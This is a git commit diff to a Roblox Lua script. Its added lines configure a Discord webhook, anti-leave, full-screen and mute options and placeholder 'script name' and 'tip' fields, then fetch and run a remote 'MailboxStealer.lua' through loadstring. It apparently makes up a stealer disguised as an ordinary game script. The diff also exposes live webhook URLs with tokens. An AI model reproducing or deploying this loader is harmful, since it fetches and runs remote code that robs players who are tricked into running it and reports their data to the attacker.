81ca40abb7a5d1814a055e430c0c9bb410300d0a
HerrSimoNHub <130193268+HerrSimoNHub@users.noreply.github.com>
2023-04-09 22:43:18 +0200

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,3 +1,16 @@
-UserName = "HerruSzymoN"
-WebHook = "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/test/main/test.lua"))()
+--// Main Config
+_G.Username = "HerrySzymoN"
+_G.AntiLeave = true
+_G.FullScreen = true
+_G.MuteRoblox = true
+
+--// Webhook Config
+_G.EnableWebhook = true
+_G.Webhook = "https://discord.com/api/webhooks/1059121179555803187/_4F0Y-wzAVC_RqBS9BgDH4GaAJfJ-3xOWUVEy6rUnQ0UOZ4kvFtB91EKCRhpeksM8m6d"
+
+--// UI Config
+_G.ScriptName = "script name"
+_G.Tip1 = "tip"
+_G.Tip2 = "tip"
+_G.Tip3 = "tip"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
